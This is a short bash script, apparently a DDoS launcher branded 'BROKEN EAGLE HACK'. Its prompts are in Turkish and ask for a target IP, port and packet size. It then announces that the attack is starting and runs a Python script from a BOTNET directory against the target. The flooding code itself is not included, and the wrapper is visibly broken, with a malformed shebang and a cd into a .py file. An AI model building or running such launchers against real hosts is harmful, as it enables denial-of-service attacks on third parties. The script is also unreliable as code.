#!bin/bash

echo -e '\e[34m
	 
-------------------------
 ____  ____   ___  ____
|  _ \|  _ \ / _ \/ ___|
| | | | | | | | | \___ \
| |_| | |_| | |_| |___) |
|____/|____/ \___/|____/
 (+ BROKEN EAGLE HACK (+
				
-------------------------
'
read -p $'\e[35mIP GİRİNİZ=>' ip
read -p $'\e[35mPORT GİRİN=>' port
read -p $'\e[35mBOYUT GİRİNİZ=>' byut
	cd $HOME/BOTNET/yrdmcı.py
	clear
	echo -e 'SALDIRI BAŞLATILIYOR...'
	sleep 3
	python yrdmcı.py -s $ip -p $port -t $byut


